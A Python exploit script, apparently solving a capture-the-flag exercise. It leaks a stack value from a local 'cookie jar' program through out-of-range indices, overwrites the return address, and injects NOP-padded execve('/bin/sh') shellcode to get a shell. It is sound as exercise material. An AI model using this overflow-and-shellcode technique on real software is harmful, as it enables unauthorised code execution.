import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
p.readuntil("whats your name?")
p.sendline("r")
p.readuntil("Which cookie jar do you want to use, 0-7? (-1 to finish)")
p.sendline("9")
p.readuntil("Do you want to eat or store a cookie [eat/store]:")
p.sendline("eat")

first_data = p.readuntil("Which")
split = str(first_data).split(' ')
split2 = split[2].replace("Which'", "").strip()
split3 = split2.replace("n", "")
split4 = split3.replace('\\', "").strip()
hexit = hex(int(split4, 16))
print(hexit)
p.sendline("11")
p.readuntil("Do you want to eat or store a cookie [eat/store]:")
p.sendline("eat")

p.readuntil("Which cookie jar do you want to use, 0-7? (-1 to finish)") 
p.sendline("11")
p.readuntil("Do you want to eat or store a cookie [eat/store]:")
p.sendline("store")
p.readuntil("Enter the cookie you want to store (in hex)!")
p.sendline("0x7fffffffece0") # Controlling the RIP

p.readuntil("Which cookie jar do you want to use, 0-7? (-1 to finish)") 
p.sendline("0")
p.readuntil("Do you want to eat or store a cookie [eat/store]:")
p.sendline("store")
p.readuntil("Enter the cookie you want to store (in hex)!")
p.sendline("0x9090909090909090") # Controlling the RIP

p.readuntil("Which cookie jar do you want to use, 0-7? (-1 to finish)") 
p.sendline("1")
p.readuntil("Do you want to eat or store a cookie [eat/store]:")
p.sendline("store")
p.readuntil("Enter the cookie you want to store (in hex)!")
p.sendline("0x9090909090909090") # Controlling the RIP

p.readuntil("Which cookie jar do you want to use, 0-7? (-1 to finish)") 
p.sendline("2")
p.readuntil("Do you want to eat or store a cookie [eat/store]:")
p.sendline("store")
p.readuntil("Enter the cookie you want to store (in hex)!")
p.sendline("0x6e69622fbb48f631") # Controlling the RIP

p.readuntil("Which cookie jar do you want to use, 0-7? (-1 to finish)") 
p.sendline("3")
p.readuntil("Do you want to eat or store a cookie [eat/store]:")
p.sendline("store")
p.readuntil("Enter the cookie you want to store (in hex)!")
p.sendline("0x5f54535668732f2f") # Controlling the RIP

# 0x50fd231583b6a
p.readuntil("Which cookie jar do you want to use, 0-7? (-1 to finish)") 
p.sendline("4")
p.readuntil("Do you want to eat or store a cookie [eat/store]:")
p.sendline("store")
p.readuntil("Enter the cookie you want to store (in hex)!")
p.sendline("0x50fd231583b6a") # Controlling the RIP






"""
Triggering the return
"""

p.readuntil("Which cookie jar do you want to use, 0-7? (-1 to finish)") 
p.sendline("-1")
p.readuntil("Did you find the cookie? Tell me what it was!! (In hex)")
p.sendline(hexit)



p.interactive()
